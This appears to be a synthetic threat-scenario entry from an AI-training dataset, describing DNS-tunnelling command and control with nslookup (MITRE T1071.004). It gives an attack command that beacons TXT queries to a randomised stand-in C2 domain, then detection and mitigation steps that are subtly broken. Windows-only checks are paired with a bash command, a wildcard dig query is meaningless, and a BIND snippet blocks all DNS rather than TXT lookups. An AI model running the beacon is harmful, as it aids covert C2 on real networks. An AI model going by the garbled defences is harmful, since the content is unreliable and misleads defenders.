---
type: campaign
scenario_id: 152
tactic: Command and Control
technique: "T1071.004: Application Layer Protocol: DNS"
technique_id: T1071.004
tags: [campaign, lotl, command_and_control]
---

# Using nslookup for DNS tunneling to establish C2.

## Threat Description
Using nslookup for DNS tunneling to establish C2.

## Attack Command
```
nslookup -q=txt $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) 8.8.8.8
```

## Detection Logic
Monitor nslookup DNS queries: `wmic process where name='nslookup.exe' get commandline | findstr txt`; Analyze DNS logs: `dig +short txt *.com`.

## Mitigation
Restrict nslookup: `icacls %windir%\System32\nslookup.exe /deny Everyone:RX`; Block TXT queries: `named.conf 'zone "." { type master; notify no; allow-query { none; }; };'`.

## AI Training Prompt
Train AI to detect nslookup DNS tunneling and suggest DNS restrictions.

## References
- MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
